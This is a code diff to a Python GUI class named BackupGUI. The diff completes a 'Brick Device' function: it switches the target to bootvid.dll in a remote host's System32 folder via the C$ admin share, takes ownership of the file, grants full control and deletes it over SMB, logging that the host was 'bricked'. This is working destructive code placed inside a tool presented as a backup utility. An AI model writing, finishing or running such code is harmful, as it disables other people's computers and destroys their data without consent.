@@ -102,33 +102,25 @@ class BackupGUI:
         self.brick_button = Button(button_frame, text="Brick Device", command=self.brick_device)
         self.brick_button.grid(row=0, column=2, sticky=EW, pady=(2, 2))
         
-    def take_ownership_and_change_permissions(file_path):
-        # Take ownership of the file
+    def take_ownership_and_change_permissions(self, file_path):
         subprocess.run(f"takeown /F {file_path}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-        # Grant full control permissions to the current user
         subprocess.run(f"icacls {file_path} /grant %username%:F", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def brick_device(self):
         try:
-            # Get the hostname and credentials
             hostname = self.hostname_value.get()
             username = self.username_value.get()
             password = self.password_value.get()
 
-            # Construct the path to the file
-            file_path = f"\\\\{hostname}\\C$\\Windows\\System32\\test.txt"
+            file_path = f"\\\\{hostname}\\C$\\Windows\\System32\\bootvid.dll"
 
-            # Take ownership and change permissions
-            take_ownership_and_change_permissions(file_path)
+            self.take_ownership_and_change_permissions(file_path)
 
-            # Authenticate with smbclient
             smbclient.register_session(hostname, username=username, password=password)
 
-            # Check if the file exists
             try:
-                smbclient.stat(file_path)  # This will raise an exception if the file doesn't exist
-                # Delete the file
+                smbclient.stat(file_path)
                 smbclient.remove(file_path)
                 self.log_info(f"Bricked {hostname} by deleting bootvid.dll.", user_friendly=True)
             except FileNotFoundError:
